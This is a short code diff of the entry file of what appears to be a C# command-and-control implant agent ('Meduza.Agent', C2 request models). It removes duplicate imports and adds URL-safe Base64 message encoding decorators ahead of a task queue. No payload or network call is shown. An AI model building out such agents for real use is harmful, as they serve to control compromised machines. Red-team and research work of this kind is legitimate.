@@ -1,26 +1,25 @@
-﻿using Agent;
-using Agent.Models;
+﻿using Agent.Models;
 using Agent.Services;
 using System.Collections.Concurrent;
 using System.Diagnostics;
-using System.IO;
 using System.IO.Pipes;
 using Agent.ModuleBase;
 using Agent.Models.C2Request;
 using System.Text.Json;
-using System.IO;
-using System.Threading;
-using System.Threading.Tasks;
-using System.Collections.Generic;
-using System.Net.Http;
-using System.Text.Json.Serialization;
-using System.Net.Http.Json;
 using Agent.Core;
 using System.Reflection;
+using Meduza.Agent;
+using Agent.Core.Utils.MessageTransformer;
+using Agent.Core.Utils.Encoding;
 
 
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
+
+// Decorator
+var baseTransformer = new BaseTransformer();
+var urlSafeBase64EncodingDecorator = new UrlSafeBase64EncodingDecorator(baseTransformer);
+var urlSafeBase64DecodingDecorator = new UrlSafeBase64DecodingDecorator(baseTransformer);
 
 // Queues, random and agentInfo 
 var taskQueue = new ConcurrentQueue<AgentTask>();
